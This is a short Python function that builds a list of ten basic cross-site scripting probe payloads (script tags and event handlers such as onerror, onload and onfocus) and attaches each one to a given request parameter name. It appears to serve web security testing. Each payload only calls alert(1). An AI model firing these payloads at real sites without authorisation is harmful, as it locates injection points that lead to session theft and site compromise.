def generate_xss_payloads(param_name):
    """
    Generate a list of basic XSS payloads based on a parameter name.
    """
    payloads = [
        f"<script>alert(1)</script>",
        f"'><img src=x onerror=alert(1)>",
        f"\" onmouseover=alert(1) x=\"",
        f"<svg onload=alert(1)>",
        f"<iframe src='javascript:alert(1)'></iframe>",
        f"<body onload=alert(1)>",
        f"<video><source onerror=\"alert(1)\"></video>",
        f"<details open ontoggle=alert(1)>",
        f"<object data='javascript:alert(1)'>",
        f"<input autofocus onfocus=alert(1)>"
    ]

    # Add parameterized version (optional)
    return [f"{param_name}={p}" for p in payloads]
